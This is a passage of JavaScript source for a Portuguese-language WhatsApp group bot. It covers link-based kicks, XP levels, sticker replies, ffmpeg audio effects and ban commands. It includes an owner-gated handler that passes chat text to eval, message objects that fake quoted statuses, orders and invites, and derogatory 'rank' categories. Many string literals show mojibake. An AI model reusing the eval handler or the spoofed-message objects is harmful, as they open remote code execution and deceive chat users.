   if (isGroupAdmins) return;
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***ùôÅùôêùôâùòæùôèùôÑùôäùôâ ùòºùôâùôèùôÑ ùôáùôÑùôâùôÜ  ùôîùôäùôêùôèùôêùòΩùôÄ ùôëùôÑùòøùôÄùôä***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("://youtu.be/")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return; 
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***ùôÅùôêùôâùòæùôèùôÑùôäùôâ ùòºùôâùôèùôÑ ùôáùôÑùôâùôÜ  ùôèùôÄùôáùôÄùôÇùôçùòºùôà***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("://t.me/")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return; 
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}
 //___________SISTEMA LEVELING AUTO____________//
 const sended = isGroup ? msg.participant : msg.key.remoteJid
 const nivelAtual = getLevelingLevel(sended)
             var patt = 'Bronze Iü•â'
             if (nivelAtual === 1) {
                 patt = 'Bronze  Iü•â'
             } else if (nivelAtual === 2) {
                 patt = 'Bronze IIü•â'
             } else if (nivelAtual === 3) {
                 patt = 'Bronze  IIIü•â'
             } else if (nivelAtual === 4) {
                 patt = 'Bronze  IVü•â'
             } else if (nivelAtual === 5) {
                 patt = 'Bronze  Vü•â'
             } else if (nivelAtual === 6) {
                 patt = 'Prata Iü•à'
             } else if (nivelAtual === 7) {
                 patt = 'Prata IIü•à'
             } else if (nivelAtual === 8) {
                 patt = 'Prata IIIü•à'
             } else if (nivelAtual === 9) {
                 patt = 'Prata IVü•à'
             } else if (nivelAtual === 10) {
                 patt = 'Prata Vü•à'
             } else if (nivelAtual === 11) {
                 patt = 'Ouro Iü•á'
             } else if (nivelAtual === 12) {
                 patt = 'Ouro IIü•á'
             } else if (nivelAtual === 13) {
                 patt = 'Ouro IIIü•á'
             } else if (nivelAtual === 14) {
                 patt = 'Ouro IVü•á'
             } else if (nivelAtual === 15) {
                 patt = 'Ouro Vü•á'
             } else if (nivelAtual === 16) {
                 patt = 'Campe√£o IüèÜ'
             } else if (nivelAtual === 17) {
                 patt = 'Campe√£o IIüèÜ'
             } else if (nivelAtual === 18) {
                 patt = 'Campe√£o IIIüèÜ'
             } else if (nivelAtual === 19) {
                 patt = 'Campe√£o IVüèÜ'
             } else if (nivelAtual === 20) {
                 patt = 'Campe√£o VüèÜ'
             } else if (nivelAtual === 21) {
                 patt = 'Diamante I üíé'
             } else if (nivelAtual === 22) {
                 patt = 'Diamante II üíé'
             } else if (nivelAtual === 23) {
                 patt = 'Diamante III üíé'
             } else if (nivelAtual === 24) {
                 patt = 'Diamante IV üíé'
             } else if (nivelAtual === 25) {
                 patt = 'Diamante V üíé'
             } else if (nivelAtual === 26) {
                 patt = 'Mestre I üêÇ'
             } else if (nivelAtual === 27) {
                 patt = 'Mestre II üêÇ'
             } else if (nivelAtual === 28) {
                 patt = 'Mestre III üêÇ'
             } else if (nivelAtual === 29) {
                 patt = 'Mestre IV üêÇ'
             } else if (nivelAtual === 30) {
                 patt = 'Mestre V üêÇ'
             } else if (nivelAtual === 31) {
                 patt = 'M√≠tico I üîÆ'
             } else if (nivelAtual === 32) {
                 patt = 'M√≠tico II üîÆ'
             } else if (nivelAtual === 33) {
                 patt = 'M√≠tico III üîÆ'
             } else if (nivelAtual === 34) {
                 patt = 'M√≠tico IV üîÆ'
             } else if (nivelAtual === 35) {
                 patt = 'M√≠tico V üîÆ'
             } else if (nivelAtual === 36) {
                 patt = 'God Iüï¥'
             } else if (nivelAtual === 37) {
                 patt = 'God IIüï¥'
             } else if (nivelAtual === 38) {
                 patt = 'God IIIüï¥'
             } else if (nivelAtual === 39) {
                 patt = 'God IVüï¥'
             } else if (nivelAtual === 40) {
                 patt = 'God Vüï¥'
             } else if (nivelAtual >= 77777) {
                 patt = '*üòà ùóóùó¢ùó°ùó¢ üòà*'
             }
 
             //_TIPO DE USU√ÅRIO
             if (isOwner) {
                 var tuser =  '*üòà ùóóùó¢ùó°ùó¢ üòà*'
            } else if (isGroupAdmins) {
                 var tuser = '*Administrador üîê*' 
             } else if (sender == isUser) {
                 var tuser = '*Registrado‚úÖ*'  
             } else {
                 var tuser = '*Membro comumüóø*'
             }            
             
             
         
             //_XP COM LEVELING ATIVO
                if (!msg.key.fromMe) {
                 if (isGroup && isLevelingOn) {
                     const currentLevel = getLevelingLevel(sended)
                     const checkId = getLevelingId(sended)
                     try {
                         if (currentLevel === undefined && checkId === undefined) addLevelingId(sended)
                         
                   
 const amountXp = Math.trunc(Math.random() * 20) * currentLevel         
                     const requiredXp = 7 * Math.round(currentLevel) * 13 * currentLevel 
                         const getLevel = getLevelingLevel(sended)
                         const namelv = checkId
                         addLevelingXp(sender, amountXp)
                         if (requiredXp <= getLevelingXp(sended)) {
                             addLevelingLevel(sended, 1)
                             const lvup = {
                                 text: `    ‚ïê‚ïê‚ïê‚ïê‚ùñLEVEL UP‚ùñ‚ïê‚ïê‚ïê‚ïê
       ‚û£ Nome: @${namelv.split('@')[0]}
   ‚ï≠‚ïº‚ïæ‚ïº‚ïæ‚ïº‚ïæ‚ïº‚ïæ‚ïº‚ïæ‚ïº‚ïæ‚ïº
   ‚îÇ‚û£ XP: ${getLevelingXp(sended)}/${requiredXp}
   ‚îÇ‚û£ Level: ${getLevel} -> ${getLevelingLevel(sended)}
   ‚îÇ‚û£ Patente: ${patt}
   ‚ï∞‚ïº‚ïæ‚ïº‚ïæ‚ïº‚ïæ‚ïº‚ïæ‚ïº‚ïæ‚ïº‚ïæ‚ïº
   
    ‚ïê‚ïê‚ïê‚ïê‚ùñLEVEL UP‚ùñ‚ïê‚ïê‚ïê‚ïê`,
                                 contextInfo: {
                                     mentionedJid: [namelv]
                                 }
                             }
                         tomioka.sendMessage(from, lvup, text, {quoted: msg})
                         }
                     } catch (err) {
                         console.error(err)
                     }
                 }
             }
//cores e quoteds
colors = ['red','white','black','blue','yellow','green']
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
var ase = new Date();
var waktoonyabro = ase.getHours();
switch(waktoonyabro){
case 0: waktoonyabro = `Boa noite ${pushname}üåõ`; break;
case 1: waktoonyabro = `Boa noite ${pushname}üåõ`; break;
case 2: waktoonyabro = `Boa noite ${pushname}üåõ`; break;
case 3: waktoonyabro = `Bom Dia ${pushname}‚ú®`; break;
case 4: waktoonyabro = `Bom Dia ${pushname}‚ú®`; break;
case 5: waktoonyabro = `Bom Dia ${pushname}‚ú®`; break;
case 6: waktoonyabro = `Bom Dia ${pushname}‚ú®`; break;
case 7: waktoonyabro = `Bom Dia ${pushname}‚ú®`; break;
case 8: waktoonyabro = `Bom Dia ${pushname}‚ú®`; break;
case 9: waktoonyabro = `Bom Dia ${pushname}‚ú®`; break;
case 10: waktoonyabro = `Bom Dia ${pushname}‚ú®`; break;
case 11: waktoonyabro = `Boa tarde ${pushname}üî•`; break;
case 12: waktoonyabro = `Boa tarde ${pushname}üî•`; break;
case 13: waktoonyabro = `Boa tarde ${pushname}üî•`; break;
case 14: waktoonyabro = `Boa tarde ${pushname}üî•`; break;
case 15: waktoonyabro = `Boa tarde ${pushname}üåπ`; break;
case 16: waktoonyabro = `Boa tarde ${pushname}üåπ`; break;
case 17: waktoonyabro = `Boa tarde ${pushname}üåπ`; break;
case 18: waktoonyabro = `Boa tarde ${pushname}üåõ`; break;
case 19: waktoonyabro = `Boa noite ${pushname}üåõ`; break;
case 20: waktoonyabro = `Boa noite ${pushname}üåõ`; break;
case 21: waktoonyabro = `Boa noite ${pushname}üåõ`; break;
case 22: waktoonyabro = `Boa noite ${pushname}üåõ`; break;
case 23: waktoonyabro = `Boa noite ${pushname}üåõ`; break;
}
var ucapanFakeenviar = '' + waktoonyabro;
if (pushname === 5544988116479) {
   pushname = 'tomioka-bot'
  }
  if ((budy === 'A√â') || (budy === 'A√©') || (budy === 'a√©')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/A√©.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'F') || (budy === 'F') || (budy === 'f')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/F.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'QUE') || (budy === 'Que') || (budy === 'que')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/Q.webp'), sticker, {contextInfo: null, quoted: msg})
}       
      if ((budy === 'OIBOT') || (budy === 'Oibot') || (budy === 'oibot')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/oibot.webp'), sticker, {contextInfo: null, quoted: msg})  
}
      if ((budy === 'FRIO') || (budy === 'Frio') || (budy === 'frio')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/frio.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'CALCULISTA') || (budy === 'Calculista') || (budy === 'calculista')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/calculista.webp'), sticker, {contextInfo: null, quoted: msg})        
}
      if (msgReceived == "bom dia"){
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/dia.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if (msgReceived == "boa noite"){
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/noite.webp'), sticker, {contextInfo: null, quoted: msg})
} 
      if ((budy === 'TOPE') || (budy === 'Tope') || (budy === 'tope')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tope.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'OI') || (budy === 'Oi') || (budy === 'oi')) {
    fakegroup (`oi '-'`)
}
      if ((budy === 'BAN') || (budy === 'Ban') || (budy === 'ban')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/ban.webp'), sticker, {contextInfo: null, quoted: msg})
}
       if ((budy === 'TOOP') || (budy === 'Toop') || (budy === 'toop')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tudo.webp'), sticker, {contextInfo: null, quoted: msg})
}
      if ((budy === 'TOMIOKINHA') || (budy === 'Tomiokinha') || (budy === 'tomiokinha')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tomiokinha.webp'), sticker, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})  
}
      if (budy.match('ksks')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/kkk.webp'), sticker, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
}
      if (budy.match('monster')) {
    tomioka.sendMessage(from, fs.readFileSync('./figurinhas/monster.webp'), sticker, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
}
//quoted
//tomioka
const ftroli2 ={key: {fromMe: false,participant:`0@s.whatsapp.net`,   remoteJid: `6289523258649-1604595598@g.us`  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`./me.jpg`), surface: 200, message: `Made with ‚ù£Ô∏è `, orderTitle: 'tomioka', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const foto = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '6283136505591-1614953337@g.us' } : {}) }, message: { 'imageMessage': { 'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc', 'mimetype': 'image/png', 'caption': `tomioka`, 'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=', 'fileLength': '28777', 'height': 1080, 'width': 1079, 'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=', 'fileEncSha256': 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=', 'directPath': '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69', 'mediaKeyTimestamp': '1610993486', 'jpegThumbnail': fs.readFileSync(`./me.jpg`)} } }
const ctt = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}\n‚û¢  ${command}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;tomioka,;;;\nFN:tomioka,\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`./me.jpg`), thumbnail:fs.readFileSync(`./me.jpg`),sendEphemeral: true}}}
const grupo = { key: {fromMe: false,participant: "0@s.whatsapp.net",remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "PINGHIN GAY","groupName": "tomioka", "caption": `tomioka-BOTÔ∏è`, 'jpegThumbnail': fs.readFileSync(`./me.jpg`)}}}
const stik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "stickerMessage": { "caption":`ola\nü™Äcomando: ${command}\n‚è±hor√°rio: ${hr} `}}} 
const doc  = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: {"imageMessage": {"caption": `„Äå tomioka „Äç\n*${runtime(process.uptime())}*`, 'jpegThumbnail': fs.readFileSync('././me.jpg')}}}
const car ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "556293294732-1625944593@g.us"  }, "message": {orderMessage: {itemCount: 34,status: 200, thumbnail: fs.readFileSync(`./me.jpg`), surface: 200, message: `‚û¢ Comando : ${command}`, orderTitle: 'sacole', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
//tomioka
const tomio = {
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "60139571124@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./me.jpg`)},"title": `${waktoonyabro}`,"description": `ùêúùê®ùê¶ùêöùêßùêùùê®: ${command}\n‚è±hor√°rio: ${hr} `, "currencyCode":`ùêúùê®ùê¶ùêöùêßùêùùê®: ${command}`,"retailerId": "…™ ·¥Ä·¥ç ùë°ùëúùëöùëñùëúùëòùëé ùëèùëúùë°","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const tome = {text: 'oi',"forwardingScore": 1000000000,isForwarded: true,sendEphemeral: true, "externalAdReply": {"title": `Canal do TIO TOMIOKA`,"body": "","previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./me.jpg`),"sourceUrl": `https://www.youtube.com/channel/UC8DcGKSSBm7kv2lXsjAmmMQ`},mentionedJid:[sender]} 
  if (!isGroup && isCmd) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color('[EXEC]'), color(pushname), color(`[NUMERO]`, 'orange'), color(sender.split('@')[0], 'pink'), color('COMANDO', 'white'), color('‚û§', 'red'), color(`[${command}]`, 'pink')) //exec em pv 
// console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'do mano', color(sender.split('@')[0]), 'args :', color(args.length))                                         
 if (!isGroup && !isCmd) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color(`[MSG]`, 'orange'), color(pushname, 'yellow'), color(`[NUMERO]`, 'orange'), color(sender.split('@')[0], 'blue')) //mensagem no pv 
// console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'do mano', color(sender.split('@')[0]), 'args :', color(args.length))
   if (isCmd && isGroup) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color('[EXEC]'), color(pushname), color(`[NUMERO]`, 'orange'), color(sender.split('@')[0], 'pink') ,color('COMANDO', 'white'), color('‚û§', 'red'), color(`[${command}]`, 'yellow'), color('NO GRUPO', 'white'), color(groupName)) //comando em grupo 
// console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'do mano', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
 if (!isCmd && isGroup) console.log(`\x1b[1;31m~\x1b[1;37m>${hr}`, color(`[MSG]`, 'orange'), color(pushname, 'yellow'), color(`[NUMERO]`, 'orange'), color(sender.split('@')[0], 'blue'), color(groupName)) //mensagem em grupo
// console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'do mano', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
let authorname = tomioka.contacts[from] != undefined ? tomioka.contacts[from].vname || tomioka.contacts[from].notify : undefined	
if (authorname != undefined) { } else { authorname = groupName }

if (budy.startsWith('=>')){
if (!isOwner) return enviar('somente meu criador')
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return enviar(bang)
}
try {
enviar(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
enviar(String(e))
}
}
if (msgReceived == "bagual"){
    const tmie = 'bla'
    tomioka.sendMessage(from, tmie,text, {quoted: car})  //ftroli2
}
switch(command) {
case 'rankes':
let temporalM = tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "MENU DOS RANKS",
"description": "clique no bot√µes abaixo e envie",
"buttonText": "clique aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'üêÇrank gados',
"rowId": `${prefix}rankgado`
},
{
"title": 'ü§©rank lindos',
"rowId": `${prefix}ranklindos`
},
{
"title": 'ü§¢rank feios',
"rowId": `${prefix}rankfeios`
},
{
"title": 'üè≥Ô∏è‚Äçüåàrank gays',
"rowId": `${prefix}rankgay`
},
{
"title": 'ü§ìrank betas',
"rowId": `${prefix}rankbeta`
},
{
"title": 'üê∫rank alfas',
"rowId": `${prefix}rankalfa`
},
{
"title": 'ü§°rank loucos',
"rowId": `${prefix}rankloucos`
},
{
"title": 'üíÇ‚Äç‚ôÇÔ∏èrank nazistas',
"rowId": `${prefix}ranknazista`
},
{
"title": '‚ù§Ô∏èsuruba',
"rowId": `${prefix}suruba`
},
{
"title": 'surub√£o',
"rowId": `${prefix}surubao`
},
{
"title": 'üåùrank iludidos',
"rowId": `${prefix}rankiludidos`
},
{
"title": 'ü§¥üèªrank principes',
"rowId": `${prefix}rankprincipes`
},
{
"title": 'üë∏üèªrank princesas',
"rowId": `${prefix}rankprincesas`
},
{
"title": 'üêírank camacos',
"rowId": `${prefix}rankcaco`
}
]
}
]                    
}
}, {quoted:tomioka})
tomioka.relayWAMessage(temporalM)
break
case 'ativo':

if (!isGroup) return enviar('s√≥ grupo')
if(groupIdscount.indexOf(from) < 0) return enviar('O bot n√£o tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar('Marque o n√∫mero que deseja puxar a atividade')
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
if(numbersIds.indexOf(mentioned[0]) >= 0) {
var indnum = numbersIds.indexOf(mentioned[0])
mentions(`ñ£ò‚Éü·óí Consulta das atividade de\nñ£ò‚Éü·óí @${mentioned[0].split('@')[0]} no grupo\nñ£ò‚Éü·óí Mensagens: ${countMessage[ind].numbers[indnum].messages}\nñ£ò‚Éü·óí Comandos dados: ${countMessage[ind].numbers[indnum].cmd_messages}`, mentioned, true)
}
else {
mentions(`‚ãÜ‚Éü€ú€£·≠™‚û£ Consulta da atividade de\n‚ãÜ‚Éü€ú€£·≠™‚û£ @${mentioned[0].split('@')[0]} no grupo\n‚ãÜ‚Éü€ú€£·≠™‚û£ Mensagens: 0\n‚ãÜ‚Éü€ú€£·≠™‚û£ Comandos dados: 0`, mentioned, true)
}
break
//_BANIR E DESBANIR USUARIO DE MEXER NO BOT 
case 'ban':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar ('*Este comando s√≥ pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `üö´@${mentioned[0].split('@')[0]} foi banido e ele n√£o poder√° mais usar comandos do botüö´`
mentions(`${susp}`, mentioned, true)   
break

case 'unban':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar ('*Este comando s√≥ pode ser usado pelo o dono!* ')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `‚ùé@${mentioned[0].split('@')[0]}foi desbloqueado e ele agora pode reutilizar os comandos do bot‚ùé`
mentions(`${susp}`, mentioned, true)   
break
//_EFEITO NIGHTCORE PARA AUDIO         
case 'nightcore':
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break   

//_EFEITO SLOW PARA AUDIO
case 'slow':
low = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
slo = await tomioka.downloadAndSaveMediaMessage(low)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${slo} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(slo)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_EFEITO ESQUILO PARA AUDIO
case 'esquilo':
pai = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
tup = await tomioka.downloadAndSaveMediaMessage(pai)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${tup} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(tup)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_EFDEITO GIGANTE PARA AUDIO	
case 'gemuk':
muk = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
gem = await tomioka.downloadAndSaveMediaMessage(muk)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_DEIXA O AUDIO R√ÅPIDO
case 'fast':
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return enviar ('Erro')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_AUMENTA O BASS DE UM AUDIO	
case 'bass':                 
ass = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
bas = await tomioka.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break

//_DEIXA O AUDIO ESTOURADO		
case 'earrape':         
case 'estourar':       
ass = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
bas = await tomioka.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=90:width_type=o:width=2:g=50 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return enviar ('Error!')
hah = fs.readFileSync(ran)
tomioka.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: msg})
fs.unlinkSync(ran)
})
break
/*case 'tts':
if (args.length < 1) return tomioka.sendMessage(from, 'Qual √© o c√≥digo da linguagem?', text, {quoted: msg})
const gtts = require('./lib/gtts')(args[0])
if (args.length < 2) return tomioka.sendMessage(from, 'Cad√™ o texto tio', text, {quoted: msg})
dtt = body.slice(9)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 600
? enviar('A maior parte do texto n√£o √© nada')
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return enviar ('falha:(')
tomioka.sendMessage(from, buff, audio, {quoted: msg, ptt:true})
fs.unlinkSync(rano)
})
})
break*/
/*case '':
veri = sender
user.push(sender)
if (isUser) return;
fs.writeFileSync('./database/user.json', JSON.stringify(user))
const kentod2 = 

`
‚ï≠‚îÄ„Äå *REGISTRO AUTOM√ÅTICO* „Äç
‚îÇRegistro bem-sucedido com
‚îÇdata e hora: ${time}
‚îÇNome: ${pushname}
‚îÇN√∫mero: wa.me/${sender.split('@')[0]}
‚îÇObrigado e use √† vontade üòä
‚îÇ‚ùóPara usar o bot digite ${prefix}menu
‚îÇTotal de usu√°rios registrados: ${user.length}
‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
`



tomioka.sendMessage(from, kentod2, MessageType.text, {quoted: tomio, contextInfo: tome})

break*/
case 'rg':
veri = sender
user.push(sender)
if (isUser) return;
fs.writeFileSync('./database/user.json', JSON.stringify(user))
const kentod = 

`
‚ï≠‚îÄ„Äå *REGISTRO DO USU√ÅRIO* „Äç
‚îÇRegistro bem-sucedido com
‚îÇdata e hora: ${time}
‚îÇNome: ${pushname}
‚îÇN√∫mero: wa.me/${sender.split('@')[0]}
‚îÇObrigado e use √† vontade üòä
‚îÇ‚ùóPara usar o bot digite ${prefix}menu
‚îÇTotal de usu√°rios registrados: ${user.length}
